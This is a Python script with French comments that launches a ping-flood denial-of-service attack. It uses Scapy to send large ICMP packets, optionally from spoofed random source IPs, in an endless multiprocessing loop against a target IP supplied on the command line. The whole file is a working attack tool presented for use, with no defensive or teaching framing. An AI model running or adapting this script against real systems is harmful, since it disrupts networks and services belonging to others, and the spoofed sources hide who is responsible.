#!/usr/bin/python3.5
# -*- coding=utf-8 -*-

#Ce script permet de lancer une "ping flood" attaque

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#Ignorer l'erreur de IPv6 lros l'utilisation de Scapy
import multiprocessing
from random import randint
from scapy.all import *
from Random_IP import Random_IP
import optparse


#On définit une fonction qui permet de pinguer avec l'adresse IP de la machine locale ou une adresse IP aléatoire.
def scapy_ping_sendone(host,random_source=True):
	id_ip = randint(1,65535)#IP identifiant
	id_ping = randint(1,65535)#ICMP identifiant
	seq_ping = randint(1,65535)#ICMP sequence
	if random_source == True:
		source_ip = Random_IP()#L'adresse IP de la source est aléatoire
		packet = IP(src=source_ip, dst=host, ttl=1, id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b'Welcome to xxxxxx'*100
	else:
		packet = IP(dst=host, ttl=1, id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b'Welcome to xxxxxx'*100
	ping = send(packet, verbose = False)

#On définit une fonction qui repètre la fonction précèdente 10000 fois.
def scapy_ping_10k(host,random_source=True):
	for i in range(10000+1):
		if random_source == True:
			scapy_ping_sendone(host)
		else:
			scapy_ping_sendone(host, random_source=False)

#On déclenche cinq processeurs.
def scapy_ping_Dos(host, processes=5, random_source=True):
	pool = multiprocessing.Pool(processes = processes)
	while True:
		try:
			pool.apply_async(scapy_ping_10k, (host,random_source))
		except KeyboardInterrupt:
			pool.terminate()

if __name__ == '__main__':
    #Example
    parser = optparse.OptionParser("python3.5 ping_dos.py -d <IP cible> -p <nombres de processeurs> -r <1:Random IP, 2:No Random IP(défault）>")
    #Paramètres
    parser.add_option('-d', dest = 'dst_ip', type = 'string', help = 'IP cible')
    parser.add_option('-p', dest = 'proces', type = 'int', help = 'Nombre de processeurs')
    parser.add_option('-r', dest = 'random', type = 'int', help = 'Random IP')
    (options, args) = parser.parse_args()
    #Montrer l'example si la commande sans paramètre
    if (options.dst_ip == None) or (options.proces == None):
        print(parser.usage)
        exit(0)
    else:
        destination_ip = options.dst_ip
        nb_processeurs = options.proces
    if options.random == 1:
        scapy_ping_Dos(destination_ip, nb_processeurs, True)
    else:
        scapy_ping_Dos(destination_ip, nb_processeurs)
